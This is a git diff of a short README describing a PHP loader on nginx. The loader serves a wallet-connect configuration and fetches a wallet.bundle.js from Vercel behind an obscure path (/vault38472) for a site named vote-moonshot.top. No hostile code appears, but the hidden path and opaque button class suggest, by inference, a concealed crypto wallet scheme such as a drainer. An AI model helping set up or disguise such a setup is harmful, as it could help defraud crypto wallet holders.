@@ -1,18 +1,27 @@
-# VPS folder (optional)
+# VPS — PHP proxy
 
-**Recommended:** use **nginx proxy only** — see root `README.md`. You do not need this folder on the server.
+The HTML site loads **`/vault38472`** (or `/vault38472.php`). nginx runs **`loader.php`**, which:
 
-Upload only:
+1. Reads **`config.php`** (your secrets)
+2. Outputs `window.__WALLET_EMBED_CONFIG__`
+3. Fetches **`wallet.bundle.js`** from Vercel (cached in `cache/`)
 
-- `vps/public/index.html` → your web root (example HTML)
-- `nginx/wallet-connect.conf` → nginx sites-available
+## Files on the server
 
----
+| File | You edit? |
+|------|-----------|
+| `config.php` | Yes — once |
+| `loader.php` | Upload once |
+| `embed-shared.php` | Upload once |
+| `public/*.html` | Yes — your pages |
 
-## Alternative: PHP loader (secrets on VPS)
+## config.php minimum
 
-Use this if you do not want config in Vercel env vars.
+```php
+'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
+'site_url' => 'https://vote-moonshot.top',
+'button_class' => 'K7mQ2',
+'reown_project_id' => '...',
+```
 
-Upload `vps/` PHP files + `config.php`, nginx `location = /vault38472` → `loader.php` (see old nginx block in git history).
-
-Most users should use **nginx → Vercel `/api/embed`** instead.
+See root **README.md** for full setup.
